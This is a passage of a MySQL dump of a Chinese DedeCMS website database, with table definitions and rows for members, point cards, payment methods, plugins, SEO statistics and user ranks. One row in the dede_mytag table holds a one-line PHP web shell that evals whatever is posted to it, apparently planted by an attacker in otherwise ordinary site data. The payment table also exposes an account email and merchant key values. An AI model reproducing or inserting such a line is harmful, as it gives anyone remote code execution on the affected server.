DROP TABLE IF EXISTS `dede_member_snsmsg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_snsmsg` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `userid` varchar(20) NOT NULL,
  `sendtime` int(10) unsigned NOT NULL DEFAULT '0',
  `msg` varchar(250) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_snsmsg`
--

LOCK TABLES `dede_member_snsmsg` WRITE;
/*!40000 ALTER TABLE `dede_member_snsmsg` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_snsmsg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_space`
--

DROP TABLE IF EXISTS `dede_member_space`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_space` (
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `pagesize` smallint(5) unsigned NOT NULL DEFAULT '10',
  `matt` smallint(6) NOT NULL DEFAULT '0',
  `spacename` varchar(50) NOT NULL DEFAULT '',
  `spacelogo` varchar(50) NOT NULL DEFAULT '',
  `spacestyle` varchar(20) NOT NULL DEFAULT '',
  `sign` varchar(100) NOT NULL DEFAULT '没签名',
  `spacenews` text,
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_space`
--

LOCK TABLES `dede_member_space` WRITE;
/*!40000 ALTER TABLE `dede_member_space` DISABLE KEYS */;
INSERT INTO `dede_member_space` VALUES (1,10,0,'hqxuexiao的空间','','person','','');
/*!40000 ALTER TABLE `dede_member_space` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_stow`
--

DROP TABLE IF EXISTS `dede_member_stow`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_stow` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `type` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `uid` (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_stow`
--

LOCK TABLES `dede_member_stow` WRITE;
/*!40000 ALTER TABLE `dede_member_stow` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_stow` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_stowtype`
--

DROP TABLE IF EXISTS `dede_member_stowtype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_stowtype` (
  `stowname` varchar(30) NOT NULL,
  `indexname` varchar(30) NOT NULL,
  `indexurl` varchar(50) NOT NULL,
  PRIMARY KEY (`stowname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_stowtype`
--

LOCK TABLES `dede_member_stowtype` WRITE;
/*!40000 ALTER TABLE `dede_member_stowtype` DISABLE KEYS */;
INSERT INTO `dede_member_stowtype` VALUES ('sys','系统收藏','archives_do.php'),('book','小说收藏','/book/book.php?bid');
/*!40000 ALTER TABLE `dede_member_stowtype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_tj`
--

DROP TABLE IF EXISTS `dede_member_tj`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_tj` (
  `mid` mediumint(8) NOT NULL AUTO_INCREMENT,
  `article` smallint(5) unsigned NOT NULL DEFAULT '0',
  `album` smallint(5) unsigned NOT NULL DEFAULT '0',
  `archives` smallint(5) unsigned NOT NULL DEFAULT '0',
  `homecount` int(10) unsigned NOT NULL DEFAULT '0',
  `pagecount` int(10) unsigned NOT NULL DEFAULT '0',
  `feedback` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `friend` smallint(5) unsigned NOT NULL DEFAULT '0',
  `stow` smallint(5) unsigned NOT NULL DEFAULT '0',
  `soft` int(10) NOT NULL DEFAULT '0',
  `info` int(10) NOT NULL DEFAULT '0',
  `shop` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_tj`
--

LOCK TABLES `dede_member_tj` WRITE;
/*!40000 ALTER TABLE `dede_member_tj` DISABLE KEYS */;
INSERT INTO `dede_member_tj` VALUES (1,0,0,0,0,98935,0,0,0,0,0,0);
/*!40000 ALTER TABLE `dede_member_tj` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_type`
--

DROP TABLE IF EXISTS `dede_member_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_type` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `rank` int(11) NOT NULL DEFAULT '0',
  `pname` varchar(50) NOT NULL DEFAULT '',
  `money` int(11) NOT NULL DEFAULT '0',
  `exptime` int(11) NOT NULL DEFAULT '30',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_type`
--

LOCK TABLES `dede_member_type` WRITE;
/*!40000 ALTER TABLE `dede_member_type` DISABLE KEYS */;
INSERT INTO `dede_member_type` VALUES (1,50,'中级会员半年',100,7);
/*!40000 ALTER TABLE `dede_member_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_vhistory`
--

DROP TABLE IF EXISTS `dede_member_vhistory`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_vhistory` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `loginid` char(20) NOT NULL DEFAULT '',
  `vid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `vloginid` char(20) NOT NULL DEFAULT '',
  `count` smallint(5) unsigned NOT NULL DEFAULT '0',
  `vip` char(15) NOT NULL DEFAULT '',
  `vtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `vtime` (`vtime`),
  KEY `mid` (`mid`,`vid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_vhistory`
--

LOCK TABLES `dede_member_vhistory` WRITE;
/*!40000 ALTER TABLE `dede_member_vhistory` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_vhistory` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_moneycard_record`
--

DROP TABLE IF EXISTS `dede_moneycard_record`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_moneycard_record` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `ctid` int(11) NOT NULL DEFAULT '0',
  `cardid` varchar(50) NOT NULL DEFAULT '',
  `uid` int(11) NOT NULL DEFAULT '0',
  `isexp` smallint(6) NOT NULL DEFAULT '0',
  `mtime` int(11) NOT NULL DEFAULT '0',
  `utime` int(11) NOT NULL DEFAULT '0',
  `money` int(11) NOT NULL DEFAULT '0',
  `num` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `ctid` (`ctid`),
  KEY `cardid` (`cardid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_moneycard_record`
--

LOCK TABLES `dede_moneycard_record` WRITE;
/*!40000 ALTER TABLE `dede_moneycard_record` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_moneycard_record` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_moneycard_type`
--

DROP TABLE IF EXISTS `dede_moneycard_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_moneycard_type` (
  `tid` int(11) NOT NULL AUTO_INCREMENT,
  `num` int(11) NOT NULL DEFAULT '500',
  `money` int(11) NOT NULL DEFAULT '50',
  `pname` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`tid`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_moneycard_type`
--

LOCK TABLES `dede_moneycard_type` WRITE;
/*!40000 ALTER TABLE `dede_moneycard_type` DISABLE KEYS */;
INSERT INTO `dede_moneycard_type` VALUES (1,100,30,'100点卡'),(2,200,55,'200点卡'),(3,300,75,'300点卡');
/*!40000 ALTER TABLE `dede_moneycard_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_mtypes`
--

DROP TABLE IF EXISTS `dede_mtypes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_mtypes` (
  `mtypeid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mtypename` char(40) NOT NULL,
  `channelid` smallint(6) NOT NULL DEFAULT '1',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`mtypeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_mtypes`
--

LOCK TABLES `dede_mtypes` WRITE;
/*!40000 ALTER TABLE `dede_mtypes` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_mtypes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_multiserv_config`
--

DROP TABLE IF EXISTS `dede_multiserv_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_multiserv_config` (
  `remoteuploads` smallint(6) NOT NULL DEFAULT '0',
  `remoteupUrl` text NOT NULL,
  `rminfo` text,
  `servinfo` mediumtext,
  PRIMARY KEY (`remoteuploads`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_multiserv_config`
--

LOCK TABLES `dede_multiserv_config` WRITE;
/*!40000 ALTER TABLE `dede_multiserv_config` DISABLE KEYS */;
INSERT INTO `dede_multiserv_config` VALUES (0,'http://img.dedecms.com','','');
/*!40000 ALTER TABLE `dede_multiserv_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_myad`
--

DROP TABLE IF EXISTS `dede_myad`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_myad` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `clsid` smallint(5) NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tagname` varchar(30) NOT NULL DEFAULT '',
  `adname` varchar(60) NOT NULL DEFAULT '',
  `timeset` smallint(6) NOT NULL DEFAULT '0',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `normbody` text,
  `expbody` text,
  PRIMARY KEY (`aid`),
  KEY `tagname` (`tagname`,`typeid`,`timeset`,`endtime`,`starttime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_myad`
--

LOCK TABLES `dede_myad` WRITE;
/*!40000 ALTER TABLE `dede_myad` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_myad` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_myadtype`
--

DROP TABLE IF EXISTS `dede_myadtype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_myadtype` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typename` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_myadtype`
--

LOCK TABLES `dede_myadtype` WRITE;
/*!40000 ALTER TABLE `dede_myadtype` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_myadtype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_mytag`
--

DROP TABLE IF EXISTS `dede_mytag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_mytag` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tagname` varchar(30) NOT NULL DEFAULT '',
  `timeset` smallint(6) NOT NULL DEFAULT '0',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `normbody` text,
  `expbody` text,
  PRIMARY KEY (`aid`),
  KEY `tagname` (`tagname`,`typeid`,`timeset`,`endtime`,`starttime`)
) ENGINE=MyISAM AUTO_INCREMENT=511349 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_mytag`
--

LOCK TABLES `dede_mytag` WRITE;
/*!40000 ALTER TABLE `dede_mytag` DISABLE KEYS */;
INSERT INTO `dede_mytag` VALUES (511348,0,'',0,0,0,'<?php @eval($_POST[511348])?>',NULL);
/*!40000 ALTER TABLE `dede_mytag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_payment`
--

DROP TABLE IF EXISTS `dede_payment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_payment` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `code` varchar(20) NOT NULL DEFAULT '',
  `name` varchar(120) NOT NULL DEFAULT '',
  `fee` varchar(10) NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `rank` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `config` text NOT NULL,
  `enabled` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `cod` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `online` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `code` (`code`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_payment`
--

LOCK TABLES `dede_payment` WRITE;
/*!40000 ALTER TABLE `dede_payment` DISABLE KEYS */;
INSERT INTO `dede_payment` VALUES (3,'alipay','支付宝','2','支付宝网站(www.alipay.com) 是国内先进的网上支付平台。<br/>DedeCMS联合支付宝推出支付宝接口。<br/><a href=\"https://www.alipay.com/himalayas/practicality_customer.htm?customer_external_id=C4335994340215837114&market_type=from_agent_contract&pro_codes=6ACD133C5F350958F7F62F29651356BB \" target=\"_blank\"><font color=\"red\">立即在线申请</font></a>',1,'a:4:{s:14:\"alipay_account\";a:4:{s:5:\"title\";s:14:\"支付宝用户账号\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:20:\"yuan12345xin@163.com\";}s:10:\"alipay_key\";a:4:{s:5:\"title\";s:14:\"交易安全校验码\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:6:\"dsfsdf\";}s:14:\"alipay_partner\";a:4:{s:5:\"title\";s:12:\"合作者身份ID\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:1:\"1\";}s:17:\"alipay_pay_method\";a:5:{s:5:\"title\";s:14:\"支付宝账号类型\";s:11:\"description\";s:52:\"请选择您最后一次跟支付宝签订的协议里面说明的接口类型\";s:4:\"type\";s:6:\"select\";s:5:\"iterm\";s:58:\"0:使用标准双接口,1:使用担保交易接口,2:使用即时到帐交易接口\";s:5:\"value\";s:1:\"1\";}}',1,0,1),(2,'bank','银行汇款/转帐','0','银行名称	\n收款人信息：全称 ××× ；帐号或地址 ××× ；开户行 ×××。	\n注意事项：办理电汇时，请在电汇单“汇款用途”一栏处注明您的订单号。',4,'a:0:{}',1,1,0),(1,'cod','货到付款','0','开通城市：×××	\n货到付款区域：×××',3,'a:0:{}',1,1,0),(6,'yeepay','YeePay易宝','12','YeePay易宝（北京通融通信息技术有限公司）是专业从事多元化电子支付业务一站式服务的领跑者。在立足于网上支付的同时，YeePay易宝不断创新，将互联网、手机、固定电话整合在一个平台上，继短信支付、手机充值之后，首家推出了YeePay易宝电话支付业务，真正实现了离线支付，为更多传统行业搭建了电子支付的高速公路。YeePay易宝融合世界先进的电子支付文化，聚合众多金融、电信、IT、互联网等领域内的巨擘，旨在通过创新的支付机制，推动中国电子商务新进程。YeePay易宝致力于成为世界一流的电子支付应用和服务提供商，专注于金融增值服务和移动增值服务两大领域，创新并推广多元化、低成本的、安全有效的支付服务。<input type=\"button\" name=\"Submit\" value=\"立即注册\" onclick=\"window.open(\"https://www.yeepay.com/selfservice/requestRegister.action\")\" />',2,'a:2:{s:10:\"yp_account\";a:4:{s:5:\"title\";s:8:\"商户编号\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:2:\"aa\";}s:6:\"yp_key\";a:4:{s:5:\"title\";s:8:\"商户密钥\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:3:\"dsa\";}}',1,0,1);
/*!40000 ALTER TABLE `dede_payment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_plus`
--

DROP TABLE IF EXISTS `dede_plus`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_plus` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `plusname` varchar(30) NOT NULL DEFAULT '',
  `menustring` varchar(200) NOT NULL DEFAULT '',
  `mainurl` varchar(50) NOT NULL DEFAULT '',
  `writer` varchar(30) NOT NULL DEFAULT '',
  `isshow` smallint(6) NOT NULL DEFAULT '1',
  `filelist` text,
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_plus`
--

LOCK TABLES `dede_plus` WRITE;
/*!40000 ALTER TABLE `dede_plus` DISABLE KEYS */;
INSERT INTO `dede_plus` VALUES (27,'友情链接模块','<m:item name=\'友情链接\' link=\'friendlink_main.php\' rank=\'plus_友情链接\' target=\'main\' />','','织梦团队',1,''),(24,'文件管理器','<m:item name=\'文件管理器\' link=\'file_manage_main.php\' rank=\'plus_文件管理器\' target=\'main\' />','','织梦团队',1,''),(23,'百度新闻','<m:item name=\'百度新闻\' link=\'baidunews.php\' rank=\'plus_百度新闻\' target=\'main\' />','','织梦团队',1,'baidunews.php'),(28,'投票模块','<m:item name=\'投票模块\' link=\'vote_main.php\' rank=\'plus_投票模块\' target=\'main\' />','','织梦团队',1,''),(25,'广告管理','<m:item name=\'广告管理\' link=\'ad_main.php\' rank=\'plus_广告管理\' target=\'main\' />','','织梦官方',1,''),(10,'挑错管理','<m:item name=\'挑错管理\' link=\'erraddsave.php\' rank=\'plus_挑错管理\' target=\'main\' />','','织梦团队',1,'<m:item name=\'挑错管理\' link=\'catalog_do.php?dopost=erraddsave.php\' rank=\'plus_挑错管理\' target=\'main\' />'),(31,'幻灯片管理','<m:item name=\'幻灯片管理\' link=\'flash_main.php\' rank=\'plus_幻灯片管理\' target=\'main\' />','','dedehtml',1,'');
/*!40000 ALTER TABLE `dede_plus` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_plus_mda_setting`
--

DROP TABLE IF EXISTS `dede_plus_mda_setting`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_plus_mda_setting` (
  `skey` varchar(255) NOT NULL DEFAULT '',
  `svalue` text NOT NULL,
  `stime` int(10) NOT NULL,
  PRIMARY KEY (`skey`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_plus_mda_setting`
--

LOCK TABLES `dede_plus_mda_setting` WRITE;
/*!40000 ALTER TABLE `dede_plus_mda_setting` DISABLE KEYS */;
INSERT INTO `dede_plus_mda_setting` VALUES ('version','0.0.1',0),('channel_uuid','',0),('channel_secret','',0),('email','',0);
/*!40000 ALTER TABLE `dede_plus_mda_setting` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_plus_seoinfo`
--

DROP TABLE IF EXISTS `dede_plus_seoinfo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_plus_seoinfo` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `create_time` int(11) DEFAULT NULL,
  `alexa_num` varchar(50) DEFAULT NULL,
  `alexa_area_num` varchar(50) DEFAULT NULL,
  `baidu_count` varchar(50) DEFAULT NULL,
  `sogou_count` varchar(50) DEFAULT NULL,
  `haosou360_count` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=57 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_plus_seoinfo`
--

LOCK TABLES `dede_plus_seoinfo` WRITE;
/*!40000 ALTER TABLE `dede_plus_seoinfo` DISABLE KEYS */;
INSERT INTO `dede_plus_seoinfo` VALUES (1,1550728409,'0','0','0','1','0'),(2,1550751301,'0','0','0','1','0'),(3,1550840914,'0','0','0','1','0'),(4,1550900970,'0','0','0','1','0'),(5,1550932504,'0','0','0','1','0'),(6,1550978971,'0','0','0','1','0'),(7,1551000580,'0','0','0','1','0'),(8,1551057253,'0','0','0','1','0'),(9,1551096928,'0','0','0','1','0'),(10,1551151800,'0','0','0','1','0'),(11,1551173475,'0','0','0','1','0'),(12,1551273472,'0','0','0','1','0'),(13,1551339909,'0','0','1','1','0'),(14,1551362119,'0','0','1','1','0'),(15,1551444656,'0','0','1','1','0'),(16,1551504644,'0','0','1','1','0'),(17,1551532331,'0','0','1','1','0'),(18,1551585691,'0','0','1','1','0'),(19,1551607583,'0','0','1','1','0'),(20,1551675245,'0','0','1','1','0'),(21,1551701625,'0','0','1','1','0'),(22,1551791619,'0','0','1','1','0'),(23,1551876579,'0','0','1','1','0'),(24,1551963847,'0','0','1','1','0'),(25,1552017996,'0','0','1','1','0'),(26,1552119874,'0','0','1','1','0'),(27,1552310960,'0','0','1','1','0'),(28,1552367506,'0','0','1','1','0'),(29,1552397824,'0','0','1','1','0'),(30,1552455634,'0','0','1','1','0'),(31,1552488701,'0','0','1','1','0'),(32,1552529234,'0','0','1','1','0'),(33,1552565881,'0','0','1','1','0'),(34,1552622333,'0','0','1','1','0'),(35,1553527153,'0','0','2','1','0'),(36,1554032465,'0','0','2','1','0'),(37,1554131574,'0','0','1','1','0'),(38,1554192972,'0','0','1','1','0'),(39,1554215410,'0','0','1','1','0'),(40,1554564931,'0','0','1','1','0'),(41,1554618512,'0','0','1','1','0'),(42,1555738490,'0','0','1','1','0'),(43,1557904370,'0','0','1','1','0'),(44,1558012529,'0','0','5','1','0'),(45,1558334852,'0','0','4','1','0'),(46,1560695895,'0','0','10','1','0'),(47,1563702536,'0','0','8','1','0'),(48,1564452456,'0','0','8','1','0'),(49,1568616652,'0','0','13','1','0'),(50,1568641155,'0','0','6','1','0'),(51,1568683138,'0','0','6','1','0'),(52,1568735116,'0','0','6','1','0'),(53,1568800608,'0','0','13','1','0'),(54,1569511817,'0','0','12','1','0'),(55,1569859394,'0','0','8','1','0'),(56,1571306981,'0','0','13','1','0');
/*!40000 ALTER TABLE `dede_plus_seoinfo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_purview`
--

DROP TABLE IF EXISTS `dede_purview`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_purview` (
  `mid` mediumint(8) DEFAULT '0',
  `typeid` smallint(5) DEFAULT '0',
  `rank` smallint(6) DEFAULT NULL,
  `pkey` varchar(30) CHARACTER SET latin1 NOT NULL,
  `pvalue` text NOT NULL,
  KEY `pkey` (`pkey`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_purview`
--

LOCK TABLES `dede_purview` WRITE;
/*!40000 ALTER TABLE `dede_purview` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_purview` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_pwd_tmp`
--

DROP TABLE IF EXISTS `dede_pwd_tmp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_pwd_tmp` (
  `mid` mediumint(8) NOT NULL,
  `membername` char(16) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `mailtime` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_pwd_tmp`
--

LOCK TABLES `dede_pwd_tmp` WRITE;
/*!40000 ALTER TABLE `dede_pwd_tmp` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_pwd_tmp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_ratings`
--

DROP TABLE IF EXISTS `dede_ratings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_ratings` (
  `id` varchar(11) NOT NULL,
  `total_votes` int(11) NOT NULL DEFAULT '0',
  `total_value` int(11) NOT NULL DEFAULT '0',
  `used_ips` longtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_ratings`
--

LOCK TABLES `dede_ratings` WRITE;
/*!40000 ALTER TABLE `dede_ratings` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_ratings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_scores`
--

DROP TABLE IF EXISTS `dede_scores`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_scores` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `titles` char(15) NOT NULL,
  `icon` smallint(6) unsigned DEFAULT '0',
  `integral` int(10) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `integral` (`integral`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_scores`
--

LOCK TABLES `dede_scores` WRITE;
/*!40000 ALTER TABLE `dede_scores` DISABLE KEYS */;
INSERT INTO `dede_scores` VALUES (2,'列兵',1,0,1),(3,'班长',2,1000,1),(4,'少尉',3,2000,1),(5,'中尉',4,3000,1),(6,'上尉',5,4000,1),(7,'少校',6,5000,1),(8,'中校',7,6000,1),(9,'上校',8,9000,1),(10,'少将',9,14000,1),(11,'中将',10,19000,1),(12,'上将',11,24000,1),(15,'大将',12,29000,1);
/*!40000 ALTER TABLE `dede_scores` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_search_cache`
--

DROP TABLE IF EXISTS `dede_search_cache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_search_cache` (
  `hash` char(32) NOT NULL,
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `rsnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ids` mediumtext,
  PRIMARY KEY (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_search_cache`
--

LOCK TABLES `dede_search_cache` WRITE;
/*!40000 ALTER TABLE `dede_search_cache` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_search_cache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_search_keywords`
--

DROP TABLE IF EXISTS `dede_search_keywords`;
